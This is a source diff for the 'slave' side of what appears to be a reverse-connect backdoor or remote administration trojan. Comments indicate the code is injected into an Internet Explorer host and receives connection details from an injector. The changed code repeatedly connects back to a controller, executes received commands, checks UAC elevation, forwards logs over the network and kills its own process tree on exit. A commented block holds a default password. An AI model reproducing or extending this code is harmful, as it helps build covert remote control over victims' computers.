@@ -1,39 +1,18 @@
 #include <windows.h>
-#include <sstream>
 HANDLE threadHandle;
 
-#include <blaspheme/Blaspheme.hpp>
-#include <common/Log.hpp>
 #include <blaspheme/protocol/ConnectionInfo.hpp>
+#include <blaspheme/Blaspheme.hpp>
+
+#include <common/Log.hpp>
+
 #include <network/Pipe.hpp>
 #include <system/Uac.hpp>
-#include "InhibitionCore.hpp"
+#include <system/Process.hpp>
+
+#include "SlaveCore.hpp"
 using namespace Inhibition;
 using namespace System;
-
-void launch()
-{
-    LOG << "Waiting connection";
-    while(true)
-    {
-		try
-		{
-			if(InhibitionCore::instance().connect())
-			{
-				while(InhibitionCore::instance().process_command());
-				LOG << "Session ending";
-				InhibitionCore::instance().disconnect();
-				LOG << "Waiting connection";
-			}
-			Sleep(500);
-		}
-		catch(Network::Deconnection&)
-		{
-			LOG << "Untimely disconnect";
-			InhibitionCore::instance().disconnect();
-		}
-    }
-}
 
 // il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
 // nous envoyer l'injecteur
@@ -73,13 +52,41 @@ DWORD WINAPI run(void)
 	try
 	{
 		LOG.setHeader("SLAVE");
-		Blaspheme::ConnectionInfo infos = getConnectionInfo();
-#ifdef INNOCENCE_DEBUG
-	    LOG.addObserver(new Common::LogToNetwork(infos.ip, infos.port));
-#endif
+		LOG.addObserver(new Common::LogToConsole);
+		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+		Blaspheme::ConnectionInfo info = getConnectionInfo();
+		/*
+		Blaspheme::ConnectionInfo info;
+		info.ip = "127.0.0.1";
+		info.port = 80;
+		info.password = "crunch";
+		info.name = "default";
+		*/
+	    
+		
+		SlaveCore slave(info);
+
 		LOG << GetElevationType();
-		InhibitionCore::instance().set_connection_infos(infos);
-		launch();
+		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
+		while(!slave.exiting())
+		{
+			try
+			{
+				if(slave.connect())
+				{
+					LOG << "Session started";
+					while(slave.process_command());
+					LOG << "Session ended";
+					slave.disconnect();
+				}
+				Sleep(500);
+			}
+			catch(Network::Deconnection&)
+			{
+				LOG << "Untimely disconnect";
+				slave.disconnect();
+			}
+		}
 	}
 	catch(std::exception& e)
 	{
@@ -89,11 +96,9 @@ DWORD WINAPI run(void)
 	{
 		LOG << "Unknown exception";
 	}
-	LOG << "Slave exiting violently...";
-	// if we arrived here, something got wrong, we MUST kill IE host
-	InhibitionCore::instance().exit();
 	
-	// never arrive here
+    System::Process::This thisProcess;
+	thisProcess.killHierarchy();
 	return EXIT_SUCCESS;
 }
 
